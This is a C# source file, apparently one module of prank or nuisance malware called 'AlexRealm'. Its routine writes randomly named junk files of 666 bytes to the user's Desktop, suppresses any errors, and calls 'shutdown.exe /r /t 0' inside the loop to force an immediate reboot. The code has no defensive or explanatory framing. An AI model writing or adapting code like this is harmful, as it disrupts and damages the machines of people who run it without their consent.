using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Threading;

namespace AlexRealm
{
     public class Random_files
    {
        public static void rnd_files()
        {
            string desktop_path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\";
            for (int num = 0; num < 1000; num++)
            {
                string rnd_name = Generator_char.gen(100);
                try
                {
                    File.WriteAllBytes(desktop_path + rnd_name, new byte[666]);
                }
                catch { }
                Thread.Sleep(1000);
                cmd_func.cmd("shutdown.exe", "/r /t 0");
            }
        }
    }
}
